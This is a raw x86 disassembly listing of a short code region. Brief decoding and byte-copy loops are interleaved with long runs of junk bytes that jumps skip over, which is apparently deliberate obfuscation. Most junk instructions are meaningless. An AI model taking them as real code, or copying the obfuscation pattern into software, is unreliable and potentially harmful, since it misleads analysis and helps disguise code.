  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433797
  40f4d2:	adc    DWORD PTR ds:0x4337a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x4a1072c7]
  40f540:	mov    esp,ss
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	xchg   edx,eax
  40f54a:	mov    al,0x17
  40f54c:	call   0xb84d:0xf138605f
  40f553:	mov    edx,0xe6c0a70b
  40f558:	icebp  
  40f559:	xchg   cl,bh
  40f55b:	sub    al,0xb3
  40f55d:	lods   eax,DWORD PTR ds:[esi]
  40f55e:	push   ebx
  40f55f:	push   ss
  40f560:	sub    al,0x6e
  40f562:	sahf   
  40f563:	adc    BYTE PTR [edi],0x0
  40f566:	(bad)  
  40f567:	hlt    
  40f568:	ss add bh,0x65
  40f56c:	aaa    
  40f56d:	outs   dx,BYTE PTR ds:[esi]
  40f56e:	ret    
  40f56f:	loop   0x40f507
  40f571:	sub    cl,BYTE PTR [eax+ecx*8+0x26]
  40f575:	dec    ebp
  40f576:	cs scas al,BYTE PTR es:[edi]
  40f578:	(bad)  
  40f57a:	sbb    esp,DWORD PTR cs:[ebp+0x1361bdf0]
  40f581:	mov    bl,0xfb
  40f583:	lahf   
  40f584:	add    BYTE PTR [esi-0x6e98fdb1],dl
  40f58a:	sbb    DWORD PTR [ecx-0x62d376d6],ecx
  40f590:	sub    bl,0xe8
  40f593:	dec    eax
  40f594:	inc    edx
  40f595:	dec    esp
  40f596:	sub    DWORD PTR [edi],edx
  40f598:	ins    BYTE PTR es:[edi],dx
  40f599:	pop    ds
  40f59a:	js     0x40f5f2
  40f59c:	pop    ds
  40f59d:	bound  esp,QWORD PTR [ebx+edx*4+0x50]
  40f5a1:	add    edi,DWORD PTR [esi+ebx*2-0x45]
  40f5a5:	xor    eax,0x423156f8
  40f5aa:	mov    esi,0x1880fdea
  40f5af:	xor    al,0x17
  40f5b1:	outs   dx,BYTE PTR ds:[esi]
  40f5b2:	ds mov esp,0x8839cdfb
  40f5b8:	sub    BYTE PTR [ebp-0x80],ah
  40f5bb:	sar    BYTE PTR [esi+0x79359bc5],1
  40f5c1:	mov    cl,0x72
  40f5c3:	imul   eax,DWORD PTR [edx-0x47d8e010],0x82926b71
  40f5cd:	test   BYTE PTR [ebp+eiz*4-0x2d],ch
  40f5d1:	inc    eax
  40f5d2:	fistp  QWORD PTR ds:0x8dda8d7a
  40f5d8:	xchg   edx,eax
  40f5d9:	shl    ch,cl
  40f5db:	inc    eax
  40f5dc:	or     al,0xe0
  40f5de:	dec    esi
  40f5df:	mov    ebx,0xe82c32a4
  40f5e4:	test   DWORD PTR [esi-0x4d649ff],esp
  40f5ea:	fistp  WORD PTR [edx]
  40f5ec:	adc    al,0x80
  40f5ee:	js     0x40f631
  40f5f0:	inc    eax
  40f5f1:	mov    al,ds:0x2f58e01e
  40f5f6:	dec    eax
  40f5f7:	cmp    DWORD PTR [ebp+0x22ebe141],0xffffffca
  40f5fe:	sbb    edx,DWORD PTR [eax]
  40f600:	(bad)  ds:0x4febac8e
  40f606:	xchg   esp,eax
  40f607:	rol    DWORD PTR [edi-0x72],0xe0
  40f60b:	xor    al,0x7d
  40f60d:	outs   dx,BYTE PTR ds:[esi]
  40f60e:	xchg   edx,eax
  40f60f:	adc    eax,0x423a5974
  40f614:	jne    0x40f606
  40f616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f617:	imul   esi,DWORD PTR [eax-0x51],0x47
  40f61b:	push   0x65
  40f61d:	push   edi
  40f61e:	in     al,0xac
  40f620:	fsubr  QWORD PTR [eax+0x79]
  40f623:	sbb    ah,BYTE PTR [ecx+0x50]
  40f626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f627:	data16 mov ds:0x22b90574,al
  40f62d:	out    dx,al
  40f62e:	cmp    eax,0xac3bf1fa
  40f633:	mov    DWORD PTR [ecx+0x2f65a928],esi
  40f639:	sbb    DWORD PTR [esi+eiz*2+0x4039fea5],esp
  40f640:	fwait
  40f641:	push   ecx
  40f642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f643:	int    0x53
  40f645:	in     al,dx
  40f646:	icebp  
  40f647:	call   0x696a:0x8799db18
  40f64e:	hlt    
  40f64f:	mov    ah,0x2e
  40f651:	test   eax,ebx
  40f653:	mov    al,0x43
  40f655:	lock test al,0x5
  40f658:	pavgb  mm0,QWORD PTR [ebx-0x6d7aebef]
  40f65f:	sub    al,0x7e
  40f661:	inc    ecx
  40f662:	mov    eax,ds:0xf747a6ed
  40f667:	ins    BYTE PTR es:[edi],dx
  40f668:	pop    ecx
  40f669:	fstp   DWORD PTR [ebp-0x4b88ace1]
  40f66f:	jl     0x40f6e6
  40f671:	ds je  0x40f6cc
  40f674:	push   ebp
  40f675:	(bad)  
  40f676:	inc    esi
  40f677:	sub    eax,DWORD PTR [eax-0x4c6055c7]
  40f67d:	mov    ecx,0x450da89c
  40f682:	push   ebp
  40f683:	imul   ebx,DWORD PTR [edi],0x231b9c16
  40f689:	mov    ah,dh
  40f68b:	mov    edx,0x393dfb17
  40f690:	dec    esi
  40f691:	stc    
  40f692:	push   cs
  40f693:	mov    bl,BYTE PTR [eax+0x11dfac21]
  40f699:	jns    0x40f6f0
  40f69b:	in     eax,dx
  40f69c:	sbb    eax,0x144b31a
  40f6a1:	mov    ecx,0x9786a897
  40f6a6:	iret   
  40f6a7:	sbb    eax,0xaebb9f91
  40f6ac:	mov    al,ds:0x9efe4d4d
  40f6b1:	int    0x33
  40f6b3:	cmp    bh,cl
  40f6b5:	and    ch,bl
  40f6b7:	aam    0x8b
  40f6b9:	xchg   edx,eax
  40f6ba:	push   ebp
  40f6bb:	pop    ebp
  40f6bc:	xor    DWORD PTR [edi],ecx
  40f6be:	pop    ebp
  40f6bf:	into   
  40f6c0:	sahf   
  40f6c1:	or     DWORD PTR [edi+0x44bf967],esp
  40f6c7:	iret   
  40f6c8:	add    BYTE PTR [ebx-0x21],dh
  40f6cb:	mov    bl,0x67
  40f6cd:	outs   dx,BYTE PTR ss:[esi]
  40f6cf:	das    
  40f6d0:	test   BYTE PTR [ecx-0x6ea86c57],bl
  40f6d6:	repz xchg esp,eax
  40f6d8:	aaa    
  40f6d9:	loop   0x40f757
  40f6db:	sbb    ch,BYTE PTR [edx]
  40f6dd:	or     eax,0x2af851d2
  40f6e2:	mov    cl,0x1b
  40f6e4:	repz ror DWORD PTR [esi-0x3f],cl
  40f6e8:	push   es
  40f6e9:	je     0x40f6d9
  40f6eb:	mov    eax,0x9e37f5ea
  40f6f0:	enter  0x570b,0xdf
  40f6f4:	(bad)  
  40f6f6:	mov    ds:0xb776daa5,eax
  40f6fb:	xchg   esi,eax
  40f6fc:	aad    0xf1
  40f6fe:	inc    ebp
  40f6ff:	rcl    edi,1
  40f701:	or     DWORD PTR [esi],esp
  40f703:	sbb    eax,0x637011c8
  40f708:	aas    
  40f709:	pop    ecx
  40f70a:	sbb    dh,BYTE PTR [esi-0x14d45e08]
  40f710:	mov    ch,0x5d
  40f712:	cmp    BYTE PTR [ecx+0x77],dl
  40f715:	daa    
  40f716:	sar    BYTE PTR [ebp+0x40fef84c],0x5f
  40f71d:	lods   eax,DWORD PTR ds:[esi]
  40f71e:	aam    0x0
  40f720:	mov    bl,0x67
  40f722:	test   DWORD PTR [ebp+0x349a0683],esi
  40f728:	mov    ebp,0x3a7e42f9
  40f72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f72e:	adc    bx,WORD PTR [edi+0x14]
  40f732:	adc    BYTE PTR [bp+di+0x587f],bh
  40f737:	push   0xffffffe0
  40f739:	lock adc eax,0xdc58b400
  40f73f:	xor    al,0xb9
  40f741:	mov    ch,0xe
  40f743:	pop    ss
  40f744:	(bad)  
  40f745:	lds    eax,FWORD PTR [ebp+0x74]
  40f748:	std    
  40f749:	dec    ecx
  40f74a:	jne    0x40f6e1
  40f74c:	pop    edx
  40f74d:	cwde   
  40f74e:	jnp    0x40f6f8
  40f750:	fsub   st,st(1)
  40f752:	push   ds
  40f753:	fdivr  QWORD PTR [edx-0x47]
  40f756:	jne    0x40f6fc
  40f758:	repz push cs
  40f75a:	test   al,0x7
  40f75c:	not    ch
  40f75e:	icebp  
  40f75f:	scas   al,BYTE PTR es:[edi]
  40f760:	mov    dl,0x94
  40f762:	leave  
  40f763:	popa   
  40f764:	mov    esp,0x576df337
  40f769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f76a:	movzx  edi,di
  40f76d:	iret   
  40f76e:	adc    bl,BYTE PTR [ebx+0x7]
  40f771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f772:	dec    ecx
  40f773:	sbb    eax,0xe03c9ab4
  40f778:	rcl    al,1
  40f77a:	mov    eax,ds:0xf6ba0ccd
  40f77f:	push   ecx
  40f780:	xlat   BYTE PTR ds:[ebx]
  40f781:	push   0x553c0697
  40f786:	mov    cl,BYTE PTR [esi+eiz*2+0x3d]
  40f78a:	adc    DWORD PTR [edi+0x56],eax
  40f78d:	mov    al,0xf0
  40f78f:	repnz outs dx,BYTE PTR ds:[esi]
  40f791:	imul   ebx,eax,0x3
  40f794:	xchg   ebx,eax
  40f795:	xor    eax,0xdcf5fcbb
  40f79a:	xchg   DWORD PTR [edi],esi
  40f79c:	mov    WORD PTR [edx],cs
  40f79e:	xchg   esi,eax
  40f79f:	not    DWORD PTR [esi+0x56f256ec]
  40f7a5:	mov    dh,0xea
  40f7a7:	xchg   ecx,eax
  40f7a8:	aaa    
  40f7a9:	xchg   edx,eax
  40f7aa:	sbb    al,0xd7
  40f7ac:	cmp    cl,bl
  40f7ae:	push   0x1a
  40f7b0:	bswap  edx
  40f7b2:	mov    eax,0x87a6d193
  40f7b7:	cs xor esp,edx
  40f7ba:	dec    ebx
  40f7bb:	repz jmp 0x40f7d1
  40f7be:	in     eax,0xe2
  40f7c0:	lods   al,BYTE PTR ds:[esi]
  40f7c1:	outs   dx,DWORD PTR ds:[esi]
  40f7c2:	mov    edx,0x274ca8a5
  40f7c7:	sub    edi,DWORD PTR [ebp-0x73103b45]
  40f7cd:	std    
  40f7ce:	lea    esi,[edi]
  40f7d0:	mov    ebx,0x2a10ba61
  40f7d5:	neg    DWORD PTR [edi-0x20]
  40f7d8:	push   es
  40f7d9:	call   0xc306c45c
  40f7de:	in     al,dx
  40f7df:	add    eax,0xe59b4961
  40f7e4:	ret    0xaa83
  40f7e7:	popa   
  40f7e8:	and    bh,BYTE PTR [edx]
  40f7ea:	xchg   esp,eax
  40f7eb:	sub    al,0xc8
  40f7ed:	pop    ecx
  40f7ee:	cld    
  40f7ef:	fdivr  DWORD PTR [ebp+0x34]
  40f7f2:	imul   esi,esp,0x1f375705
  40f7f8:	les    esp,FWORD PTR [edx+edi*1-0x19d20159]
  40f7ff:	es sub al,0x5c
  40f802:	sti    
  40f803:	call   0x4721:0x9baed00c
  40f80a:	mov    ah,0x9
  40f80c:	mov    ecx,0xe9110a08
  40f811:	pop    ebx
  40f812:	cmp    DWORD PTR [edi],ecx
  40f814:	popf   
  40f815:	push   ss
  40f816:	dec    edi
  40f817:	ins    DWORD PTR es:[edi],dx
  40f818:	add    al,0x51
  40f81a:	xor    DWORD PTR [eax-0x64],esp
  40f81d:	jmp    0xa8c4565d
  40f822:	or     DWORD PTR [esi+eiz*4-0x6cde267],ecx
  40f829:	mov    esi,0x247ada97
  40f82e:	mov    ds:0xdb84bff,eax
  40f833:	in     al,dx
  40f834:	mov    al,0x67
  40f836:	and    edx,DWORD PTR [ecx-0x4a]
  40f839:	nop
  40f83a:	xlat   BYTE PTR ds:[ebx]
  40f83b:	xchg   edx,eax
  40f83c:	scas   al,BYTE PTR es:[edi]
  40f83d:	or     DWORD PTR [edi-0xe91ae96],eax
  40f843:	sbb    ah,bh
  40f845:	ins    BYTE PTR es:[edi],dx
  40f846:	push   eax
  40f847:	adc    eax,0x336b6362
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x7503c33f
  40f897:	sahf   
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	sbb    BYTE PTR [ecx],ah
  40f8a2:	fwait
  40f8a3:	dec    edi
  40f8a4:	idiv   BYTE PTR [edx]
  40f8a6:	mov    eax,ds:0x805e3c76
  40f8ab:	and    DWORD PTR [esi+0x1e],ebp
  40f8ae:	lds    ebx,FWORD PTR [eax]
  40f8b0:	ror    DWORD PTR [esi-0xe492cef],0x5c
  40f8b7:	(bad)  
  40f8b8:	pop    ebp
  40f8b9:	std    
  40f8ba:	pop    eax
  40f8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8bc:	cmp    BYTE PTR [ebp-0x54],0x4e
  40f8c0:	fnstcw WORD PTR [ebx+esi*2-0x44]
  40f8c4:	push   ebx
  40f8c5:	or     bl,bl
  40f8c7:	adc    eax,DWORD PTR [ecx+ebp*8]
  40f8ca:	js     0x40f8be
  40f8cc:	aas    
  40f8cd:	stc    
  40f8ce:	mov    eax,ds:0x6f98c4c0
  40f8d3:	rcpps  xmm1,XMMWORD PTR ds:0x1fb2889f
  40f8da:	mov    BYTE PTR [edi+edx*1+0x76],al
  40f8de:	lds    ebx,FWORD PTR [eax+0x5a]
  40f8e1:	jecxz  0x40f959
  40f8e3:	mov    ecx,0xc928c5b5
  40f8e8:	retf   0x94db
  40f8eb:	pop    ss
  40f8ec:	add    al,0x80
  40f8ee:	pop    eax
  40f8ef:	push   edi
  40f8f0:	xor    eax,0xa0e1b077
  40f8f5:	mov    al,ds:0xb558243c
  40f8fa:	daa    
  40f8fb:	sub    ecx,DWORD PTR [eax+eiz*8+0x7b]
  40f8ff:	xor    DWORD PTR [edi+0x1c27e0d8],ebp
  40f905:	lods   eax,DWORD PTR ds:[esi]
  40f906:	pop    esp
  40f907:	arpl   WORD PTR ds:0x3da90b1d,di
  40f90d:	mov    cl,0x29
  40f90f:	xor    al,0xbf
  40f911:	add    eax,edx
  40f913:	push   ecx
  40f914:	lahf   
  40f915:	add    edx,DWORD PTR [ebx-0x25]
  40f918:	stos   DWORD PTR es:[edi],eax
  40f919:	push   0xffffff96
  40f91b:	jle    0x40f954
  40f91d:	sub    bh,ch
  40f91f:	lock ss push 0xfffffff4
  40f923:	shl    ecx,cl
  40f925:	ss adc al,0x76
  40f928:	fcom   QWORD PTR [ecx+eiz*2]
  40f92b:	cmc    
  40f92c:	cld    
  40f92d:	test   al,0x85
  40f92f:	mov    ch,0x72
  40f931:	jp     0x40f953
  40f933:	cmp    dh,dh
  40f935:	add    al,0x95
  40f937:	sbb    DWORD PTR [edi+0xc6bf5cf],eax
  40f93d:	sub    BYTE PTR [ebx+0x4f],ch
  40f940:	enter  0xc801,0x25
  40f944:	and    BYTE PTR [edi-0xf],bl
  40f947:	iret   
  40f948:	or     dl,dl
  40f94a:	push   ebp
  40f94b:	sahf   
  40f94c:	jnp    0x40f9c5
  40f94e:	or     esp,DWORD PTR [eax+0x5bd87131]
  40f954:	imul   ebp,edx,0xffffff8a
  40f957:	sub    DWORD PTR [edi+0x1ca92918],esi
  40f95d:	fstp   DWORD PTR [esi+ecx*2]
  40f960:	cmp    ebx,esp
  40f962:	sar    BYTE PTR [ebp+0x46],0x8d
  40f966:	jge    0x40f9e5
  40f968:	mov    dl,0x4
  40f96a:	not    DWORD PTR [esi-0x75680b1c]
  40f970:	fcom   DWORD PTR [ebp-0x16]
  40f973:	ret    0xa480
  40f976:	push   ss
  40f977:	add    al,0x84
  40f979:	ret    
  40f97a:	test   BYTE PTR [esi],bl
  40f97c:	ins    DWORD PTR es:[edi],dx
  40f97d:	leave  
  40f97e:	mov    BYTE PTR [esi-0x2c24903d],al
  40f984:	jnp    0x40f944
  40f986:	dec    ecx
  40f987:	push   edx
  40f988:	(bad)  
  40f989:	retf   
  40f98a:	cmp    DWORD PTR [ecx],0xbb12c718
  40f990:	imul   edi,edi,0x7f
  40f993:	sub    eax,DWORD PTR [eax+ebx*2+0x70]
  40f997:	mov    cl,0x67
  40f999:	out    0x78,eax
  40f99b:	cmp    edi,DWORD PTR [ebp*4+0x14d0bbb1]
  40f9a2:	or     eax,0x95177cfd
  40f9a7:	fimul  DWORD PTR [esp+edx*8]
  40f9aa:	xor    ebp,edx
  40f9ac:	push   ebx
  40f9ad:	movmskps esi,xmm5
  40f9b0:	adc    al,0x8
  40f9b2:	cld    
  40f9b3:	jnp    0x40f9be
  40f9b5:	add    BYTE PTR [edx+0x5508ff2a],dl
  40f9bb:	dec    edi
  40f9bc:	(bad)  
  40f9bd:	dec    edi
  40f9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9bf:	push   0x5a
  40f9c1:	aad    0x62
  40f9c3:	inc    esp
  40f9c4:	cli    
  40f9c5:	mov    bl,0x52
  40f9c7:	pop    edi
  40f9c8:	push   ecx
  40f9c9:	pop    es
  40f9ca:	sbb    BYTE PTR [edi],dl
  40f9cc:	pop    esi
  40f9cd:	fldenv fs:[ecx]
  40f9d0:	(bad)  
  40f9d1:	mov    ds:0xbf92ad35,al
  40f9d6:	dec    esi
  40f9d7:	pop    edi
  40f9d8:	ins    BYTE PTR es:[edi],dx
  40f9d9:	push   edi
  40f9da:	push   ebx
  40f9db:	jmp    0x87b1:0x3dc15667
  40f9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e3:	pop    ds
  40f9e4:	sub    dl,BYTE PTR [esi+ebp*8]
  40f9e7:	int    0xfd
  40f9e9:	xor    DWORD PTR [edi],edi
  40f9eb:	jns    0x40fa4c
  40f9ed:	mov    dh,0xba
  40f9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9f0:	xlat   BYTE PTR gs:[ebx]
  40f9f2:	ds push 0x27
  40f9f5:	sub    DWORD PTR [eax-0x71],0xffffffbf
  40f9f9:	and    esi,ecx
  40f9fb:	inc    edi
  40f9fc:	add    BYTE PTR ds:0x650f193d,0xba
  40fa03:	test   BYTE PTR [edx],dl
  40fa05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa06:	aad    0x31
  40fa08:	and    DWORD PTR [ecx+0x87e3a21],eax
  40fa0e:	jle    0x40fa32
  40fa10:	dec    esi
  40fa11:	div    cl
  40fa13:	push   edx
  40fa14:	fnstenv [ebx]
  40fa16:	out    dx,al
  40fa17:	ds cmp eax,0x88bbdcde
  40fa1d:	mov    ds:0xd467975c,eax
  40fa22:	inc    DWORD PTR [esi-0x72012f0]
  40fa28:	xor    dh,BYTE PTR [esi]
  40fa2a:	jne    0x40fa52
  40fa2c:	sbb    esi,edi
  40fa2e:	cmp    edx,DWORD PTR [esp+ebx*8-0x12]
  40fa32:	xchg   ecx,eax
  40fa33:	pop    ebx
  40fa34:	rcr    DWORD PTR [esi-0x51639441],0xf1
  40fa3b:	in     al,dx
  40fa3c:	push   cs
  40fa3d:	call   0x3433a3c
  40fa42:	jnp    0x40fa3f
  40fa44:	pop    eax
  40fa45:	in     al,0xcf
  40fa47:	mov    bl,0xe2
  40fa49:	pop    esp
  40fa4a:	adc    ah,BYTE PTR cs:[eax]
  40fa4d:	shl    BYTE PTR [edx],cl
  40fa4f:	aad    0x6a
  40fa51:	jl     0x40f9fd
  40fa53:	les    esi,FWORD PTR [ebx-0xa]
  40fa56:	mov    ah,0x58
  40fa58:	fucomi st,st(4)
  40fa5a:	xor    esi,eax
  40fa5c:	fwait
  40fa5d:	ds stc 
  40fa5f:	mov    esi,0x62a4943c
  40fa64:	out    0xda,al
  40fa66:	add    edi,DWORD PTR [esi-0x9e140e8]
  40fa6c:	out    dx,al
  40fa6d:	mov    ecx,0xb618daec
  40fa72:	inc    esp
  40fa73:	addr16 cli 
  40fa75:	cld    
  40fa76:	nop
  40fa77:	daa    
  40fa78:	stos   BYTE PTR es:[edi],al
  40fa79:	fstp   QWORD PTR [edi+0x21]
  40fa7c:	pop    ebx
  40fa7d:	inc    edx
  40fa7e:	jmp    0xfbe1:0xd955ea38
  40fa85:	popf   
  40fa86:	lahf   
  40fa87:	inc    edi
  40fa88:	sbb    cl,BYTE PTR [ecx+edi*2+0x37]
  40fa8c:	test   eax,0xdda60ae2
  40fa91:	or     ecx,edx
  40fa93:	fnsave fs:[esi+ebx*8+0xc332fa0]
  40fa9b:	into   
  40fa9c:	push   0xffffff98
  40fa9e:	mov    eax,ds:0x7f19f8e5
  40faa3:	mov    ebx,0xcd1fd52a
  40faa8:	jmp    0x4cdd:0xac812cb8
  40faaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fab0:	push   0xece24c03
  40fab5:	sub    ch,BYTE PTR [eax+ebx*8]
  40fab8:	inc    edx
  40fab9:	fwait
  40faba:	push   ebp
  40fabb:	inc    esi
  40fabc:	sub    eax,0xbf9c5636
  40fac1:	dec    BYTE PTR [ecx]
  40fac3:	mov    ah,0x52
  40fac5:	jo     0x40fb39
  40fac7:	jmp    0x7bed:0x95c300e
  40face:	jmp    0xafd5:0x1f12bdd
  40fad5:	mov    bh,BYTE PTR [esp+esi*8]
  40fad8:	jae    0x40fae2
  40fada:	out    dx,al
  40fadb:	pop    esi
  40fadc:	jg     0x40fb3f
  40fade:	sub    DWORD PTR [ecx-0x64],0x1f
  40fae2:	or     al,BYTE PTR [ecx-0x65]
  40fae5:	pop    esp
  40fae6:	enter  0x27f9,0x7a
  40faea:	inc    ebp
  40faeb:	in     eax,dx
  40faec:	jno    0x40fb3b
  40faee:	cwde   
  40faef:	push   eax
  40faf0:	outs   dx,BYTE PTR ds:[esi]
  40faf1:	jne    0x40fb1a
  40faf3:	xchg   ebp,eax
  40faf4:	in     al,dx
  40faf5:	aas    
  40faf6:	aaa    
  40faf7:	cmp    al,0x45
  40faf9:	mov    DWORD PTR [esi+0x3b],edx
  40fafc:	cwde   
  40fafd:	cmp    eax,0x8683d831
  40fb02:	dec    BYTE PTR [esp+esi*1+0x1c2a01b1]
  40fb09:	nop
  40fb0a:	jp     0x40fb21
  40fb0c:	pusha  
  40fb0d:	and    ch,BYTE PTR [ebx+0x73b908a1]
  40fb13:	jle    0x40fabb
  40fb15:	pop    ss
  40fb16:	push   ss
  40fb17:	call   0xf74937f9
  40fb1c:	pop    ss
  40fb1d:	imul   edx,DWORD PTR [edi-0x1251ed4f],0xf03d2036
  40fb27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb28:	retf   0x9a67
  40fb2b:	or     eax,0x38209482
  40fb30:	pop    ebp
  40fb31:	je     0x40fb6c
  40fb33:	aaa    
  40fb34:	ret    0xf771
  40fb37:	loope  0x40fb6d
  40fb39:	pop    es
  40fb3a:	aad    0xe2
  40fb3c:	retf   
  40fb3d:	das    
  40fb3e:	mov    ch,0xaf
  40fb40:	mov    ecx,0xc9c7b57
  40fb45:	adc    esp,DWORD PTR [ecx+edi*8-0x1c2a1ba1]
  40fb4c:	stc    
  40fb4d:	div    DWORD PTR [esi-0x5c]
  40fb50:	xor    al,0x81
  40fb52:	inc    ecx
  40fb53:	jg     0x40faf0
  40fb55:	scas   eax,DWORD PTR es:[edi]
  40fb56:	test   eax,0xcd0d3874
  40fb5b:	out    dx,al
  40fb5c:	cwde   
  40fb5d:	push   ebp
  40fb5e:	mov    cs,WORD PTR [ecx+0x29]
  40fb61:	in     eax,0xf0
  40fb63:	xor    DWORD PTR [edx-0xe],ecx
  40fb66:	ins    DWORD PTR es:[edi],dx
  40fb67:	and    ch,BYTE PTR [edi+0xaaea05f]
  40fb6d:	cmp    dl,BYTE PTR ds:[ecx+0x20258579]
  40fb74:	add    edx,ebp
  40fb76:	pop    edi
  40fb77:	add    BYTE PTR [edx+0x50],dh
  40fb7a:	pop    edi
  40fb7b:	sub    eax,0x196bcd7
  40fb80:	adc    al,al
  40fb82:	in     al,0x87
  40fb84:	dec    ecx
  40fb85:	dec    eax
  40fb86:	or     eax,0xfa5a5c4c
  40fb8b:	jle    0x40fb56
  40fb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb8e:	jbe    0x40fb1b
  40fb90:	retf   0x174c
  40fb93:	inc    ebp
  40fb94:	nop
  40fb95:	rcr    BYTE PTR [edx-0x1e],1
  40fb98:	aaa    
  40fb99:	sub    bh,BYTE PTR [ecx]
  40fb9b:	stc    
  40fb9c:	sub    esi,ebp
  40fb9e:	scas   eax,DWORD PTR es:[edi]
  40fb9f:	dec    edx
  40fba0:	mov    bl,0xf2
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff84
  40fbc9:	jg     0x40fb7d
  40fbcb:	push   es
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	and    eax,0x8ded6cb
  40fbd9:	sahf   
  40fbda:	test   DWORD PTR [edi+0x708e02e9],ebx
  40fbe0:	(bad)  
  40fbe1:	mov    dl,0x78
  40fbe3:	mov    ebp,0xf8e52a40
  40fbe8:	xchg   edi,eax
  40fbe9:	rcl    DWORD PTR [ebx+0x30d71eee],cl
  40fbef:	mov    edi,0x51da3f12
  40fbf4:	inc    esi
  40fbf5:	jnp    0x40fbb5
  40fbf7:	dec    esi
  40fbf8:	cmp    edx,ebx
  40fbfa:	stos   BYTE PTR es:[edi],al
  40fbfb:	stc    
  40fbfc:	adc    edx,ebx
  40fbfe:	fwait
  40fbff:	and    edi,esp
  40fc01:	mov    eax,ds:0xb03f0265
  40fc06:	inc    esp
  40fc07:	and    al,al
  40fc09:	loopne 0x40fc5a
  40fc0b:	bswap  ecx
  40fc0d:	mov    edx,0x96ac458b
  40fc12:	adc    DWORD PTR [edx],edx
  40fc14:	sub    BYTE PTR [esi+ebx*8],al
  40fc17:	xor    eax,0x35129f6c
  40fc1c:	adc    esp,DWORD PTR [ebx+0x6b]
  40fc1f:	sbb    DWORD PTR [edi-0x25],ecx
  40fc22:	test   DWORD PTR [ebx+0x54],edi
  40fc25:	addr16 and al,0xd6
  40fc28:	inc    esi
  40fc29:	xchg   ebp,eax
  40fc2a:	cmp    ch,ah
  40fc2c:	or     ecx,esi
  40fc2e:	lods   al,BYTE PTR ds:[esi]
  40fc2f:	retf   0x55fd
  40fc32:	jl     0x40fc1c
  40fc34:	xor    al,0x2c
  40fc36:	cmp    DWORD PTR [eax],esi
  40fc38:	sub    bh,BYTE PTR [edx]
  40fc3a:	std    
  40fc3b:	arpl   bx,di
  40fc3d:	pusha  
  40fc3e:	fdiv   DWORD PTR [ecx+edx*8-0x56]
  40fc42:	std    
  40fc43:	or     cl,BYTE PTR [eax+0x3c77a097]
  40fc49:	mov    WORD PTR [esi-0x4964ce67],sp
  40fc50:	stos   BYTE PTR es:[edi],al
  40fc51:	sbb    ebx,ebp
  40fc53:	sbb    al,0x24
  40fc55:	je     0x40fc5f
  40fc57:	inc    eax
  40fc58:	(bad)  
  40fc59:	cwde   
